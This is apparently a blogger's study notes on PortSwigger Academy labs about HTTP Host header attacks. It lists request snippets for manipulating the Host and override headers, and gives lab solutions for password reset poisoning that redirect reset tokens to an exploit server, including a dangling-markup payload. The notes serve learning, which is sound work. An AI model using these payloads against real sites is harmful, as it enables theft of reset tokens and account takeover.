---
title: PortSwigger | Host Header Attacks
date: '2024-04-04'
tags: ['PortSwigger', 'PortSwigger Labs', 'Web Security']
draft: false
summary: 
---

## Host Header Attacks
The `Host` header in HTTP is mandatory since `HTTP/1.1`.  It specifies the domain name the client wants to access. Now a days its common for multiple websites to be accessible via same IP address.

There are two scenarios :
Virtual Hosting : Multiple Websites hosted on a single IP address
Routing : Multiple websites being load balanced via a single reverse proxy

In both the above cases host header is an important component to determine where the request should be sent. Many websites don't know what domain they are deployed on. They usually get the help from server `_SERVER['HOST']`  to retrieve domain name. As Host header is attacker controllable , this can lead to many vulnerabilities if not properly escaped or sanitized.

We can use following techniques to check for this vulnerability :
- Supply an arbitrary Host header
- Check for flawed validation
```http
GET /example HTTP/1.1 
Host: vulnerable-website.com:bad-stuff-here
```
- Send ambiguous requests
- Inject duplicate host headers
```http
GET /example HTTP/1.1 
Host: vulnerable-website.com 
Host: bad-stuff-here
```
- Supply an absolute URL
```http
GET https://vulnerable-website.com/ HTTP/1.1 
Host: bad-stuff-here
```
- Add line wrapping
```http
GET /example HTTP/1.1 
	Host: bad-stuff-here 
Host: vulnerable-website.com
```
- Inject Host override headers
```http
GET /example HTTP/1.1 
Host: vulnerable-website.com 
X-Forwarded-Host: bad-stuff-here
```

Some other headers we can use :
- `X-Host`
- `X-Forwarded-Server`
- `X-HTTP-Host-Override`
- `Forwarded`


##### Password reset poisoning
If the password reset url is dynamically generated via user controllable input such as Host header it may be possible to get a poisoned link

###### lab : Basic password reset poisoning
```http

// [https://0a11000b0368653481ef11260005004d.web-security-academy.net/forgot-password?temp-forgot-password-token=157e68e7ajplv4x9vqnal6mqmbresc63](https://0a11000b0368653481ef11260005004d.web-security-academy.net/forgot-password?temp-forgot-password-token=157e68e7ajplv4x9vqnal6mqmbresc63)


// Host header is changed to the exploit server to get token 
Host: exploit-0a89002f03c065a5816b10c5014000ba.exploit-server.net

// This leads to a token leakage , we replace the token in the above url to change the password of the victim
```

###### lab : Password reset poisoning via middleware
```http
// using X-Forwarded-Host to point to attack server to get token 
X-Forwarded-Host: exploit-0a5c002103f7509381cf0299018f0045.exploit-server.net
```

###### lab : Password reset poisoning via dangling markup
```http
Host: 0aa300e1045c624780ddb26a00e30026.web-security-academy.net:'<a href="//exploit-0ae2002404e662c680b5b19f010400d5.exploit-server.net/?
```

##### Web cache poisoning via Host header

